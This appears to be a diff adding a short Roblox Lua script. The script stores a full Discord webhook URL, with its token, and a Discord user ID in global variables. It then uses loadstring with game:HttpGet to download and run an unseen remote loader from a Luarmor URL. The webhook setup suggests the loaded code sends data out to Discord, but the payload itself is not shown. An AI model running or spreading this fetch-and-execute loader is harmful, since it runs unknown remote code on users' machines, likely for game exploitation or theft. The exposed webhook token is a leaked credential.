@@ -1,0 +1,4 @@
+_G.WebhookURL = "https://discord.com/api/webhooks/1203873700064272404/ONG3i05OJ95sw1F1ERMh40kn5Zno22C5P3ihUydWec2sNGCvWw70Teuiz5iUPjnD0iBQ"  
+_G.DiscUserID = "484739592239579136"
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d68b8e56fab88bf7d726a7690f48b72b.lua"))()
